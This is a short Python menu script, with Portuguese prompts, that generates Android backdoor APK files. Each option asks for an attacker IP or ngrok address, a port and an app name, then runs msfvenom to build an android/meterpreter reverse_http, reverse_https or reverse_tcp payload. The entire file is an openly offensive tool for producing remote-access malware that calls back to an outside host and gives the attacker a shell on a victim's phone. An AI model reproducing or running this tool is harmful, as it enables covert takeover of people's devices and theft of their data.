from os import system

def fun_android_menu():
	system('clear')
	print("""
📍️ ANDROID BACKDOOR 📱️👾️

[01] - android/meterpreter/reverse_http
[02] - android/meterpreter/reverse_https
[03] - android/meterpreter/reverse_tcp
[99] - Exit ❌️
		""")
	cmd = str(input('➡️  '))

	if cmd == '1':
		system('clear')
		print('📍️ Criando Backdoor com reverse http')
		ip = str(input('[❗️] - IP/NGROK: '))
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p android/meterpreter/reverse_http LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')

	elif cmd == '2':
		system('clear')
		print('📍️ Criando Backdoor com reverse https')
		ip = str(input('[❗️] - IP/NGROK: '))
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p android/meterpreter/reverse_https LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')

	elif cmd == '3':
		system('clear')
		print('📍️ Criando Backdoor com reverse tcp')
		ip = str(input('[❗️] - IP/NGROK: '))
		port = int(input('[❗️] - Port: '))
		name =  str(input('[❗️] - Name app (Example: backdoor.apk): '))
		system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {name}')
		print('Backdoor criada com sucesso! ✅️')

	elif cmd == '99':
		print('Volte sempre ☺️❤️')
		exit()
